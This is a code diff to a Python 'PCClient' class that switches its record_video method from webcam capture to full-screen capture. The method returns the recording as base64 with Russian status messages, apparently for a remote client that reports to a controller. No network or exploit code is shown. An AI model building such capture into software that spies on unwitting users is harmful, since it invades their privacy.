@@ -233,27 +233,26 @@ class PCClient:
     
     def record_video(self, seconds):
         try:
-            cap = cv2.VideoCapture(0)
+
+            screen_size = pyautogui.size()
             fourcc = cv2.VideoWriter_fourcc(*'MJPG')
-            temp_file = f"temp_video_{self.device_id}.avi"
-            out = cv2.VideoWriter(temp_file, fourcc, 20.0, (640, 480))
+            temp_file = f"temp_screenvideo_{self.device_id}.avi"
+            out = cv2.VideoWriter(temp_file, fourcc, 10.0, screen_size)
             start_time = time.time()
             frame_written = False
             while (time.time() - start_time) < seconds:
-                ret, frame = cap.read()
-                if ret and frame is not None and frame.sum() > 0:
-                    out.write(frame)
-                    frame_written = True
-                else:
-                    time.sleep(0.1)
-            cap.release()
+                img = pyautogui.screenshot()
+                frame = np.array(img)
+                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+                out.write(frame)
+                frame_written = True
             out.release()
             if not frame_written:
-                return "Ошибка: не удалось записать видео (нет кадров с камеры)", None, None
+                return "Ошибка: не удалось записать видео (нет кадров)", None, None
             with open(temp_file, "rb") as f:
                 video_bytes = f.read()
             os.remove(temp_file)
-            return f"Видео записано ({seconds} сек)", base64.b64encode(video_bytes).decode('utf-8'), 'video'
+            return f"Видео экрана записано ({seconds} сек)", base64.b64encode(video_bytes).decode('utf-8'), 'video'
         except Exception as e:
             return f"Ошибка записи видео: {str(e)}", None, None
     
